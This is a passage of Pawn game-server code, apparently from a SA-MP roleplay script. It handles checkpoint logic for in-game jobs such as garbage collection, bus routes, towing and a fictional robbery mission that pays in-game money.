        TogglePlayerControllable(playerid,0);
        SCM(playerid,COLOR_ROUZ,"Please wait to pickup trashes.");
        DisablePlayerCheckpoint(playerid);
        SetTimerEx("garbage", 5000, false, "iifff", playerid,CP[playerid]+1,1785.745361,-1146.392944,23.914796);
        Trashlevel[playerid] = 9;
    }
    else if(CP[playerid] == 4002321)
    {
        TogglePlayerControllable(playerid,0);
        SCM(playerid,COLOR_ROUZ,"Please wait to pickup trashes.");
        DisablePlayerCheckpoint(playerid);
        SetTimerEx("garbage", 5000, false, "iifff", playerid,CP[playerid]+1,1828.393066,-1143.889038,23.916961);
        Trashlevel[playerid] = 10;
    }
    else if(CP[playerid] == 4002322)
    {
        TogglePlayerControllable(playerid,0);
        SCM(playerid,COLOR_ROUZ,"Please wait to pickup trashes.");
        DisablePlayerCheckpoint(playerid);
        SetTimerEx("garbage", 5000, false, "iifff", playerid,CP[playerid]+1,1829.104858,-1084.440673,23.894075);
        Trashlevel[playerid] = 11;
    }
    else if(CP[playerid] == 4002323)
    {
        TogglePlayerControllable(playerid,0);
        SCM(playerid,COLOR_ROUZ,"Please wait to pickup trashes.");
        DisablePlayerCheckpoint(playerid);
        SetTimerEx("garbage", 5000, false, "iifff", playerid,CP[playerid]+1,1685.226440,-1067.213134,23.906858);
        Trashlevel[playerid] = 12;
    }
    else if(CP[playerid] == 4002324)
    {
        TogglePlayerControllable(playerid,0);
        SCM(playerid,COLOR_ROUZ,"Please wait to pickup trashes.");
        DisablePlayerCheckpoint(playerid);
        SetTimerEx("garbage", 5000, false, "iifff", playerid,CP[playerid]+1,1660.046020,-1061.290039,23.625539);
        Trashlevel[playerid] = 13;
    }
    else if(CP[playerid] == 4002325)
    {
        TogglePlayerControllable(playerid,0);
        SCM(playerid,COLOR_ROUZ,"Please wait to pickup trashes.");
        DisablePlayerCheckpoint(playerid);
        SetTimerEx("garbage", 5000, false, "iifff", playerid,CP[playerid]+1,1522.405151,-1018.379455,23.919734);
        Trashlevel[playerid] = 14;
    }
    else if(CP[playerid] == 4002326)
    {
        TogglePlayerControllable(playerid,0);
        SCM(playerid,COLOR_ROUZ,"Please wait to pickup trashes.");
        DisablePlayerCheckpoint(playerid);
        SetTimerEx("garbage", 5000, false, "iifff", playerid,CP[playerid]+1,1313.581542,-1095.853881,25.634815);
        Trashlevel[playerid] = 15;
    }
    else if(CP[playerid] == 4002327)
    {
        TogglePlayerControllable(playerid,0);
        SCM(playerid,COLOR_ROUZ,"Please wait to pickup trashes.");
        DisablePlayerCheckpoint(playerid);
        SetTimerEx("garbage", 5000, false, "iifff", playerid,CP[playerid]+1,1322.108520,-1237.576416,13.546875);
        Trashlevel[playerid] = 16;
    }
    else if(CP[playerid] == 4002328)
    {
        TogglePlayerControllable(playerid,0);
        SCM(playerid,COLOR_ROUZ,"Please wait to pickup trashes.");
        DisablePlayerCheckpoint(playerid);
        SetTimerEx("garbage", 5000, false, "iifff", playerid,CP[playerid]+1,1357.855712,-1487.796386,13.539655);
        Trashlevel[playerid] = 17;
    }
    else if(CP[playerid] == 4002329)
    {
        TogglePlayerControllable(playerid,0);
        SCM(playerid,COLOR_ROUZ,"Please wait to pickup trashes.");
        DisablePlayerCheckpoint(playerid);
        SetTimerEx("garbage", 5000, false, "iifff", playerid,CP[playerid]+1,1460.671630,-1492.498535,13.546875);
        Trashlevel[playerid] = 18;
    }
    else if(CP[playerid] == 4002330)
    {
        TogglePlayerControllable(playerid,0);
        SCM(playerid,COLOR_ROUZ,"Please wait to pickup trashes.");
        DisablePlayerCheckpoint(playerid);
        SetTimerEx("garbage", 5000, false, "iifff", playerid,CP[playerid]+1,1094.815673,-1881.170776,13.546875);
        Trashlevel[playerid] = 19;
    }
    else if(CP[playerid] == 4002331)
    {
        TogglePlayerControllable(playerid,0);
        SCM(playerid,COLOR_ROUZ,"Please wait to pickup trashes.");
        DisablePlayerCheckpoint(playerid);
        SetTimerEx("garbage", 5000, false, "iifff", playerid,CP[playerid]+1,2109.051269,-2009.960083,13.546875);
        Trashlevel[playerid] = 20;
    }
    else if(CP[playerid] == 4002332)
    {
        CP[playerid] = 0;
        OnCheckpoint[playerid] = 0;
        DisablePlayerCheckpoint(playerid);
        SCM(playerid,COLOR_LIGHTBLUE,"Good, You can dump your trashes and earn money, use /dumptrash.");
        Trashlevel[playerid] = 0;
    }
    else if(CP[playerid] == 54654)
    {
        OnCheckpoint[playerid] = 1;
        SCM(playerid,COLOR_LIGHTBLUE,"use /enter to enter City hall for /getjob.");
        DisablePlayerCheckpoint(playerid);
        CP[playerid] = 90000;
        SetPlayerCheckpoint(playerid,366.540283,188.152526,1008.382812, 3.0);
    }
    else if(CP[playerid] == 90000)
    {
        OnCheckpoint[playerid] = 1;
        SCM(playerid,COLOR_WHITE,"Push!!");
        DisablePlayerCheckpoint(playerid);
        CP[playerid] = 90001;
        SetPlayerCheckpoint(playerid,359.5408,206.7693,1008.3828, 3.0);
    }
    else if(CP[playerid] == 90001)
    {
        SCM(playerid,COLOR_LIGHTBLUE,"Here is Detective job, You can become a Detective, Use /getjob to join.");
        DisablePlayerCheckpoint(playerid);
        CP[playerid] = 0;
        OnCheckpoint[playerid] = 0;
    }
    else if(CP[playerid] == 54655)
    {
        OnCheckpoint[playerid] = 1;
        SCM(playerid,COLOR_LIGHTBLUE,"use /enter to enter City hall and /getjob.");
        DisablePlayerCheckpoint(playerid);
        CP[playerid] = 90002;
        SetPlayerCheckpoint(playerid,362.0605,173.7425,1008.3828, 3.0);
    }
    else if(CP[playerid] == 90002)
    {
        SCM(playerid,COLOR_LIGHTBLUE,"Here is Lawyer job, You can become a lawyer, Use /getjob to join.");
        DisablePlayerCheckpoint(playerid);
        CP[playerid] = 0;
        OnCheckpoint[playerid] = 0;
    }
    else if(CP[playerid] == 54656)
    {
        OnCheckpoint[playerid] = 1;
        SCM(playerid,COLOR_LIGHTBLUE,"use /enter to enter Crack house and /getjob.");
        DisablePlayerCheckpoint(playerid);
        CP[playerid] = 90003;
        SetPlayerCheckpoint(playerid,323.507873,1117.880981,1083.882812, 3.0);
    }
    else if(CP[playerid] == 79655)
    {
        SCM(playerid,COLOR_LIGHTBLUE,"Here is Garbage man job, You can become a garbage man, Use /getjob to join.");
        CP[playerid] = 0;
        DisablePlayerCheckpoint(playerid);
        OnCheckpoint[playerid] = 0;
    }
    else if(CP[playerid] == 812912)
    {
        SCM(playerid,COLOR_LIGHTBLUE,"Baraye Gereftan  Shoghl /getjob Ra Bezanid.");
        CP[playerid] = 0;
        DisablePlayerCheckpoint(playerid);
        OnCheckpoint[playerid] = 0;
    }
    else if(CP[playerid] == 90003)
    {
        SCM(playerid,COLOR_LIGHTBLUE,"Here is Drugs dealer job, You can become a drugs dealer, Use /getjob to join.");
        DisablePlayerCheckpoint(playerid);
        CP[playerid] = 0;
        OnCheckpoint[playerid] = 0;
    }
    else if(CP[playerid] == 54657)
    {
        SCM(playerid,COLOR_LIGHTBLUE,"Here is Car jacker job, You can become a car jacker, Use /getjob to join.");
        DisablePlayerCheckpoint(playerid);
        CP[playerid] = 0;
        OnCheckpoint[playerid] = 0;
    }
    else if(CP[playerid] == 54658)
    {
        SCM(playerid,COLOR_LIGHTBLUE,"Here is Car mechanic, You can become a car mechanic job, Use /getjob to join.");
        DisablePlayerCheckpoint(playerid);
        CP[playerid] = 0;
        OnCheckpoint[playerid] = 0;
    }
    else if(CP[playerid] == 54659)
    {
        SCM(playerid,COLOR_LIGHTBLUE,"Here is LS Bus driver, You can become a Bus driver, Use /getjob to join.");
        DisablePlayerCheckpoint(playerid);
        CP[playerid] = 0;
        OnCheckpoint[playerid] = 0;
    }
    else if(CP[playerid] == 54660)
    {
        SCM(playerid,COLOR_LIGHTBLUE,"Here is LV Bus driver job, You can become a Bus driver, Use /getjob to join.");
        DisablePlayerCheckpoint(playerid);
        CP[playerid] = 0;
        OnCheckpoint[playerid] = 0;
    }
    else if(CP[playerid] == 54670)
    {
        SCM(playerid,COLOR_LIGHTBLUE,"Here is Trucker job, You can become a trucker, Use /getjob to join.");
        DisablePlayerCheckpoint(playerid);
        CP[playerid] = 0;
        OnCheckpoint[playerid] = 0;
    }
    else if(CP[playerid] == 54680)
    {
        SCM(playerid,COLOR_LIGHTBLUE,"Here is farmer job, You can Become a farmer, Use /getjob to join.");
        DisablePlayerCheckpoint(playerid);
        CP[playerid] = 0;
        OnCheckpoint[playerid] = 0;
    }
    else if(CP[playerid] == 54689)
    {
        SCM(playerid,COLOR_LIGHTBLUE,"Here is farmer job, You can Become a farmer, Use /getjob to join.");
        DisablePlayerCheckpoint(playerid);
        CP[playerid] = 0;
        OnCheckpoint[playerid] = 0;
    }
    else if(CP[playerid] == 78642)
    {
        SCM(playerid,COLOR_LIGHTBLUE,"Here is Arms Dealer job, You can Become an Arms Dealer, Use /getjob to join.");
        DisablePlayerCheckpoint(playerid);
        CP[playerid] = 0;
        OnCheckpoint[playerid] = 0;
    }
    else if(CP[playerid] == 9922555)
    {
        DisablePlayerCheckpoint(playerid);
        CP[playerid] = 0;
        OnCheckpoint[playerid] = 0;
    }
    else if(CP[playerid] == 1200)
    {
        if(ManTooBusam[playerid] == 0) { CP[playerid] = 0; DisablePlayerCheckpoint(playerid); return SCM(playerid,COLOR_LIGHTRED,"You are not in any bus."); }
        DisablePlayerCheckpoint(playerid);
        TogglePlayerControllable(playerid, 0);
        SetTimerEx("busstop1", 5000, false, "i", playerid);
        SCM(playerid,COLOR_LIGHTBLUE,"Wait here for 5 seconds");
        BusLevel[playerid] = 1;
    }
    else if(CP[playerid] == 1201)
    {
        if(ManTooBusam[playerid] == 0) { CP[playerid] = 0; DisablePlayerCheckpoint(playerid); return SCM(playerid,COLOR_LIGHTRED,"You are not in any bus."); }
        DisablePlayerCheckpoint(playerid);
        TogglePlayerControllable(playerid, 0);
        SetTimerEx("busstop2", 5000, false, "i", playerid);
        SCM(playerid,COLOR_LIGHTBLUE,"Wait here for 5 seconds");
        BusLevel[playerid] = 2;
    }
    else if(CP[playerid] == 1202)
    {
        if(ManTooBusam[playerid] == 0) { CP[playerid] = 0; DisablePlayerCheckpoint(playerid); return SCM(playerid,COLOR_LIGHTRED,"You are not in any bus."); }
        DisablePlayerCheckpoint(playerid);
        TogglePlayerControllable(playerid, 0);
        SetTimerEx("busstop3", 5000, false, "i", playerid);
        SCM(playerid,COLOR_LIGHTBLUE,"Wait here for 5 seconds");
        BusLevel[playerid] = 3;
    }
    else if(CP[playerid] == 1203)
    {
        if(ManTooBusam[playerid] == 0) { CP[playerid] = 0; DisablePlayerCheckpoint(playerid); return SCM(playerid,COLOR_LIGHTRED,"You are not in any bus."); }
        DisablePlayerCheckpoint(playerid);
        TogglePlayerControllable(playerid, 0);
        SetTimerEx("busstop4", 5000, false, "i", playerid);
        SCM(playerid,COLOR_LIGHTBLUE,"Wait here for 5 seconds");
        BusLevel[playerid] = 4;
    }
    else if(CP[playerid] == 1204)
    {
        if(ManTooBusam[playerid] == 0) { CP[playerid] = 0; DisablePlayerCheckpoint(playerid); return SCM(playerid,COLOR_LIGHTRED,"You are not in any bus."); }
        DisablePlayerCheckpoint(playerid);
        TogglePlayerControllable(playerid, 0);
        SetTimerEx("busstop5", 5000, false, "i", playerid);
        SCM(playerid,COLOR_LIGHTBLUE,"Wait here for 5 seconds");
        BusLevel[playerid] = 5;
    }
    else if(CP[playerid] == 1205)
    {
        if(ManTooBusam[playerid] == 0) { CP[playerid] = 0; DisablePlayerCheckpoint(playerid); return SCM(playerid,COLOR_LIGHTRED,"You are not in any bus."); }
        DisablePlayerCheckpoint(playerid);
        TogglePlayerControllable(playerid, 0);
        SetTimerEx("busstop6", 5000, false, "i", playerid);
        SCM(playerid,COLOR_LIGHTBLUE,"Wait here for 5 seconds");
        BusLevel[playerid] = 6;
    }
    else if(CP[playerid] == 1206)
    {
        if(ManTooBusam[playerid] == 0) { CP[playerid] = 0; DisablePlayerCheckpoint(playerid); return SCM(playerid,COLOR_LIGHTRED,"You are not in any bus."); }
        DisablePlayerCheckpoint(playerid);
        TogglePlayerControllable(playerid, 0);
        SetTimerEx("busstop7", 5000, false, "i", playerid);
        SCM(playerid,COLOR_LIGHTBLUE,"Wait here for 5 seconds");
        BusLevel[playerid] = 7;
    }
    else if(CP[playerid] == 1207)
    {
        if(ManTooBusam[playerid] == 0) { CP[playerid] = 0; DisablePlayerCheckpoint(playerid); return SCM(playerid,COLOR_LIGHTRED,"You are not in any bus."); }
        DisablePlayerCheckpoint(playerid);
        TogglePlayerControllable(playerid, 0);
        SetTimerEx("busstop8", 5000, false, "i", playerid);
        SCM(playerid,COLOR_LIGHTBLUE,"Wait here for 5 seconds");
        BusLevel[playerid] = 8;
    }
    else if(CP[playerid] == 1208)
    {
        if(ManTooBusam[playerid] == 0) { CP[playerid] = 0; DisablePlayerCheckpoint(playerid); return SCM(playerid,COLOR_LIGHTRED,"You are not in any bus."); }
        DisablePlayerCheckpoint(playerid);
        TogglePlayerControllable(playerid, 0);
        SetTimerEx("busstop9", 5000, false, "i", playerid);
        SCM(playerid,COLOR_LIGHTBLUE,"Wait here for 5 seconds");
        BusLevel[playerid] = 9;
    }
    else if(CP[playerid] == 1209)
    {
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
    DisablePlayerCheckpoint(playerid);
    TogglePlayerControllable(playerid, 0);
    SetTimerEx("busstop10", 5000, false, "i", playerid);
    SCM(playerid,COLOR_LIGHTBLUE,"Wait here for 5 seconds");
    BusLevel[playerid] = 10;
    }
    else if(CP[playerid] == 1210)
    {
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
    DisablePlayerCheckpoint(playerid);
    TogglePlayerControllable(playerid, 0);
    SetTimerEx("busstop11", 5000, false, "i", playerid);
    SCM(playerid,COLOR_LIGHTBLUE,"Wait here for 5 seconds");
    BusLevel[playerid] = 11;
    }
    else if(CP[playerid] == 1211)
    {
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
    DisablePlayerCheckpoint(playerid);
    TogglePlayerControllable(playerid, 0);
    SetTimerEx("busstop12", 5000, false, "i", playerid);
    SCM(playerid,COLOR_LIGHTBLUE,"Wait here for 5 seconds");
    BusLevel[playerid] = 12;
    }
    else if(CP[playerid] == 1212)
    {
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
    DisablePlayerCheckpoint(playerid);
    TogglePlayerControllable(playerid, 0);
    SetTimerEx("busstop13", 5000, false, "i", playerid);
    SCM(playerid,COLOR_LIGHTBLUE,"Wait here for 5 seconds");
    BusLevel[playerid] = 13;
    }
    else if(CP[playerid] == 1213)
    {
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
    DisablePlayerCheckpoint(playerid);
    TogglePlayerControllable(playerid, 0);
    SetTimerEx("busstop14", 5000, false, "i", playerid);
    SCM(playerid,COLOR_LIGHTBLUE,"Wait here for 5 seconds");
    BusLevel[playerid] = 14;
    }
    else if(CP[playerid] == 1214)
    {
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
    DisablePlayerCheckpoint(playerid);
    TogglePlayerControllable(playerid, 0);
    SetTimerEx("busstop15", 5000, false, "i", playerid);
    SCM(playerid,COLOR_LIGHTBLUE,"Wait here for 5 seconds");
    BusLevel[playerid] = 15;
    }
    else if(CP[playerid] == 1215)
    {
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
    DisablePlayerCheckpoint(playerid);
    TogglePlayerControllable(playerid, 0);
    SetTimerEx("busstop16", 5000, false, "i", playerid);
    SCM(playerid,COLOR_LIGHTBLUE,"Wait here for 5 seconds");
    BusLevel[playerid] = 16;
    }
    else if(CP[playerid] == 1216)
    {
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
    DisablePlayerCheckpoint(playerid);
    OnCheckpoint[playerid] = 1;
    SetPlayerCheckpoint(playerid, 1818.860473,-2093.046386,13.382812, 3.0);
    CP[playerid] = 1200;
    Benzin[GetPlayerVehicleID(playerid)] = 100;
    DarsadBenzin[GetPlayerVehicleID(playerid)] = 0;
    SCM(playerid,COLOR_LIGHTBLUE,"Good job, you go to the all bus stops and back i give you $150 money");
    SCM(playerid,COLOR_LIGHTBLUE,"you can go to the checkpoint again and earn money.");
    GivePlayerPool(playerid, 150);
    BusLevel[playerid] = 0;
    }
    else if(CP[playerid] == 1217)
    {
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
    DisablePlayerCheckpoint(playerid);
    TogglePlayerControllable(playerid, 0);
    SetTimerEx("busstop17", 5000, false, "i", playerid);
    SCM(playerid,COLOR_LIGHTBLUE,"Wait here for 5 seconds");
    BusLevelLV[playerid] = 1;
    }
    else if(CP[playerid] == 1218)
    {
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
    DisablePlayerCheckpoint(playerid);
    TogglePlayerControllable(playerid, 0);
    SetTimerEx("busstop18", 5000, false, "i", playerid);
    SCM(playerid,COLOR_LIGHTBLUE,"Wait here for 5 seconds");
    BusLevelLV[playerid] = 2;
    }
    else if(CP[playerid] == 1219)
    {
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
    DisablePlayerCheckpoint(playerid);
    TogglePlayerControllable(playerid, 0);
    SetTimerEx("busstop19", 5000, false, "i", playerid);
    SCM(playerid,COLOR_LIGHTBLUE,"Wait here for 5 seconds");
    BusLevelLV[playerid] = 3;
    }
    else if(CP[playerid] == 1220)
    {
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
    DisablePlayerCheckpoint(playerid);
    TogglePlayerControllable(playerid, 0);
    SetTimerEx("busstop20", 5000, false, "i", playerid);
    SCM(playerid,COLOR_LIGHTBLUE,"Wait here for 5 seconds");
    BusLevelLV[playerid] = 4;
    }
    else if(CP[playerid] == 1221)
    {
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
    DisablePlayerCheckpoint(playerid);
    TogglePlayerControllable(playerid, 0);
    SetTimerEx("busstop21", 5000, false, "i", playerid);
    SCM(playerid,COLOR_LIGHTBLUE,"Wait here for 5 seconds");
    BusLevelLV[playerid] = 5;
    }
    else if(CP[playerid] == 1222)
    {
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
    DisablePlayerCheckpoint(playerid);
    TogglePlayerControllable(playerid, 0);
    SetTimerEx("busstop22", 5000, false, "i", playerid);
    SCM(playerid,COLOR_LIGHTBLUE,"Wait here for 5 seconds");
    BusLevelLV[playerid] = 6;
    }
    else if(CP[playerid] == 1223)
    {
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTBLUE,"You are not in any bus.");
return 1;
}
    DisablePlayerCheckpoint(playerid);
    TogglePlayerControllable(playerid, 0);
    SetTimerEx("busstop23", 5000, false, "i", playerid);
    SCM(playerid,COLOR_LIGHTBLUE,"Wait here for 5 seconds");
    BusLevelLV[playerid] = 7;
    }
    else if(CP[playerid] == 1224)
    {
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
    DisablePlayerCheckpoint(playerid);
    TogglePlayerControllable(playerid, 0);
    SetTimerEx("busstop24", 5000, false, "i", playerid);
    SCM(playerid,COLOR_LIGHTBLUE,"Wait here for 5 seconds");
    BusLevelLV[playerid] = 8;
    }
    else if(CP[playerid] == 1225)
    {
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
    DisablePlayerCheckpoint(playerid);
    TogglePlayerControllable(playerid, 0);
    SetTimerEx("busstop25", 5000, false, "i", playerid);
    SCM(playerid,COLOR_LIGHTBLUE,"Wait here for 5 seconds");
    BusLevelLV[playerid] = 9;
    }
    else if(CP[playerid] == 1226)
    {
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
    DisablePlayerCheckpoint(playerid);
    TogglePlayerControllable(playerid, 0);
    SetTimerEx("busstop26", 5000, false, "i", playerid);
    SCM(playerid,COLOR_LIGHTBLUE,"Wait here for 5 seconds");
    BusLevelLV[playerid] = 10;
    }
    else if(CP[playerid] == 1227)
    {
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
    DisablePlayerCheckpoint(playerid);
    TogglePlayerControllable(playerid, 0);
    SetTimerEx("busstop27", 5000, false, "i", playerid);
    SCM(playerid,COLOR_LIGHTBLUE,"Wait here for 5 seconds");
    BusLevelLV[playerid] = 11;
    }
    else if(CP[playerid] == 1228)
    {
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
    DisablePlayerCheckpoint(playerid);
    TogglePlayerControllable(playerid, 0);
    SetTimerEx("busstop28", 5000, false, "i", playerid);
    SCM(playerid,COLOR_LIGHTBLUE,"Wait here for 5 seconds");
    BusLevelLV[playerid] = 12;
    }
    else if(CP[playerid] == 1229)
    {
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
    DisablePlayerCheckpoint(playerid);
    TogglePlayerControllable(playerid, 0);
    SetTimerEx("busstop29", 5000, false, "i", playerid);
    SCM(playerid,COLOR_LIGHTBLUE,"Wait here for 5 seconds");
    BusLevelLV[playerid] = 13;
    }
    else if(CP[playerid] == 1230)
    {
if(ManTooBusam[playerid] == 0)
{
SCM(playerid,COLOR_LIGHTRED,"You are not in any bus.");
return 1;
}
    DisablePlayerCheckpoint(playerid);
    OnCheckpoint[playerid] = 1;
    SetPlayerCheckpoint(playerid, 1923.362792,2315.286132,10.671875, 3.0);
    CP[playerid] = 1217;
    Benzin[GetPlayerVehicleID(playerid)] = 100;
    DarsadBenzin[GetPlayerVehicleID(playerid)] = 0;
    SCM(playerid,COLOR_LIGHTBLUE,"Good job, you go to the all bus stops and back i give you $150 money");
    SCM(playerid,COLOR_LIGHTBLUE,"you can go to the checkpoint again and earn money.");
    BusLevelLV[playerid] = 0;
    GivePlayerPool(playerid, 150);
    }
 else if(CP[playerid]==80)//DMV CK
    {
        DisablePlayerCheckpoint(playerid);
        OnCheckpoint[playerid] = 0;
    }
else if(CP[playerid] >= 2002001 && CP[playerid] <= 2002009)
{
        new level = PlayerInfo[playerid][pRobSkill];
        new pool; new sttrr[128];
        if(level >= 0 && level <= 19) { pool = RandomShomare(10000,20000); }
        else if(level >= 20 && level <= 49) { pool = RandomShomare(20000,30000); }
        else if(level >= 50 && level <= 74) { pool = RandomShomare(30000,40000); }
        else if(level >= 75 && level <= 99) { pool = RandomShomare(40000,50000); }
        else if(level >= 100) { pool = RandomShomare(50000,60000); }
        for(new i;i<LastPID;i++)
        {
            if(IsPlayerConnected(i))
            {
                if(RobDriver[i] == playerid)
                {
                    if(PINFO[i][pRobSkill] < 101) {PINFO[i][pRobSkill] ++; SaveKonVal(i, "pRobSkill", PINFO[i][pRobSkill]);}
                    new leveel = PlayerInfo[i][pRobSkill];
                    if(leveel == 20)
                    { SendClientMessage(i, COLOR_YELLOW, "Your Rob Skill is now Level 2."); }
                    else if(leveel == 50)
                    { SendClientMessage(i, COLOR_YELLOW, "Your Rob Skill is now Level 3."); }
                    else if(leveel == 75)
                    { SendClientMessage(i, COLOR_YELLOW, "Your Rob Skill is now Level 4."); }
                    else if(leveel == 100)
                    { SendClientMessage(i, COLOR_YELLOW, "Your Rob Skill is now Level 5."); }
                    GivePlayerPool(i, pool);
                    SCM(i,COLOR_ALI,"Rob Success");
                    format(sttrr, sizeof(sttrr), "You have recieved %s of this rob",FormatNumber(pool));
                    SCM(i,COLOR_GREEN,sttrr);
                    format(sttrr, sizeof(sttrr), "+ $%s",FormatNumber(pool));
                    GameTextForPlayer(i, sttrr, 4000, 3);
                    OnRob[i] = false;
                    RobDriver[i] = INVALID_PLAYER_ID;
                    //SaveAccount(i);
                }
             }
        }
        SetVehicleToRespawn(GetPlayerVehicleID(playerid));
        if(PINFO[playerid][pRobSkill] < 101) {PINFO[playerid][pRobSkill] ++; SaveKonVal(playerid, "pRobSkill", PINFO[playerid][pRobSkill]);}
        new leveel = PlayerInfo[playerid][pRobSkill];
        if(leveel == 20)
        { SendClientMessage(playerid, COLOR_YELLOW, "Your Rob Skill is now Level 2."); }
        else if(leveel == 50)
        { SendClientMessage(playerid, COLOR_YELLOW, "Your Rob Skill is now Level 3."); }
        else if(leveel == 75)
        { SendClientMessage(playerid, COLOR_YELLOW, "Your Rob Skill is now Level 4."); }
        else if(leveel == 100)
        { SendClientMessage(playerid, COLOR_YELLOW, "Your Rob Skill is now Level 5."); }
        GivePlayerPool(playerid, pool);
        SCM(playerid,COLOR_ALI,"Rob Success");
        format(sttrr, sizeof(sttrr), "You have recieved %s of this rob",FormatNumber(pool));
        SCM(playerid,COLOR_GREEN,sttrr);
        format(sttrr, sizeof(sttrr), "+ $%s",FormatNumber(pool));
        GameTextForPlayer(playerid, sttrr, 4000, 3);
        OnRob[playerid] = false;
        RobDriver[playerid] = INVALID_PLAYER_ID;
        RobLeader[playerid] = false;
        RobMemberCount[playerid] = 0;
        for(new i;i<100;i++)
        {
            RobMember[playerid][i] = INVALID_PLAYER_ID;
        }
        //SaveAccount(playerid);
}
    //////////////
    else if(CP[playerid]==198)//TCC LS
    {
        new towedcar;
        towedcar = GetVehicleTrailer(GetPlayerVehicleID(playerid));
        GivePlayerPool(playerid, 150);
        SendClientMessage(playerid, COLOR_LIGHTBLUE, "You destroyed the car for $150");
        GameTextForPlayer(playerid, "~b~Car was successful destroyed", 2500, 1);
        SetVehicleToRespawn(towedcar);
        DisablePlayerCheckpoint(playerid);
        OnCheckpoint[playerid] = 0;
        CP[playerid] = 0;
    }
    else if(CP[playerid]==199)//TCC LV
    {
        new towedcar;
        towedcar = GetVehicleTrailer(GetPlayerVehicleID(playerid));
        GivePlayerPool(playerid, 150);
        SendClientMessage(playerid, COLOR_LIGHTBLUE, "You destroyed the car for $150");
        GameTextForPlayer(playerid, "~b~Car was successful destroyed", 2500, 1);
        SetVehicleToRespawn(towedcar);
        DisablePlayerCheckpoint(playerid);
        OnCheckpoint[playerid] = 0;
        CP[playerid] = 0;
    }
    else if(CP[playerid] == 94531)
    {
    //SCM(playerid,COLOR_LIGHTBLUE,"Helper: Inja Exam Ya Amoozeshgah Ranandegi Hast. Be Pish Alamat Beravid Va /Exam Ra Vared Konid.");
    //CP[playerid] = 0;
    //DisablePlayerCheckpoint(playerid);
    //OnCheckpoint[playerid] = 0;
    }
    else if(CP[playerid] == 94532)
    {
    
    }
    else if(CP[playerid] == 5)
    {
        GameTextForPlayer(playerid, "~y~At the Missions Checkpoint", 2500, 1);
        CP[playerid] = 0;
        DisablePlayerCheckpoint(playerid);
        OnCheckpoint[playerid] = 0;
    }
    /*else if(CP[playerid] == 9)//Karting
    {
        GameTextForPlayer(playerid, "~r~Wait here for more Kart Racers", 4000, 3);
//      DisablePlayerCheckpoint(playerid);
//      OnCheckpoint[playerid] = 0;
    }
    else if(CP[playerid] == 10) { CP[playerid] = 11; DisablePlayerCheckpoint(playerid); SetPlayerCheckpoint(playerid,2258.7874,-2402.9712,12.7035,8.0); OnCheckpoint[playerid] = 1; }
    else if(CP[playerid] == 11) { CP[playerid] = 12; DisablePlayerCheckpoint(playerid); SetPlayerCheckpoint(playerid,2225.8755,-2461.3875,12.7190,8.0); OnCheckpoint[playerid] = 1; }
    else if(CP[playerid] == 12) { CP[playerid] = 13; DisablePlayerCheckpoint(playerid); SetPlayerCheckpoint(playerid,2276.9983,-2662.8328,12.8580,8.0); OnCheckpoint[playerid] = 1; }
    else if(CP[playerid] == 13) { CP[playerid] = 14; DisablePlayerCheckpoint(playerid); SetPlayerCheckpoint(playerid,2449.1399,-2663.0562,12.8138,8.0); OnCheckpoint[playerid] = 1; }
    else if(CP[playerid] == 14) { CP[playerid] = 15; DisablePlayerCheckpoint(playerid); SetPlayerCheckpoint(playerid,2566.9814,-2504.5686,12.7692,8.0); OnCheckpoint[playerid] = 1; }
    else if(CP[playerid] == 15) { CP[playerid] = 16; DisablePlayerCheckpoint(playerid); SetPlayerCheckpoint(playerid,2719.0520,-2503.5962,12.7706,8.0); OnCheckpoint[playerid] = 1; }
    else if(CP[playerid] == 16) { CP[playerid] = 17; DisablePlayerCheckpoint(playerid); SetPlayerCheckpoint(playerid,2720.7881,-2405.6589,12.7441,8.0); OnCheckpoint[playerid] = 1; }
    else if(CP[playerid] == 17) { CP[playerid] = 18; DisablePlayerCheckpoint(playerid); SetPlayerCheckpoint(playerid,2571.5195,-2401.1531,12.7528,8.0); OnCheckpoint[playerid] = 1; }
    else if(CP[playerid] == 18) { CP[playerid] = 19; DisablePlayerCheckpoint(playerid); SetPlayerCheckpoint(playerid,2406.6995,-2423.1182,12.6641,8.0); OnCheckpoint[playerid] = 1; }
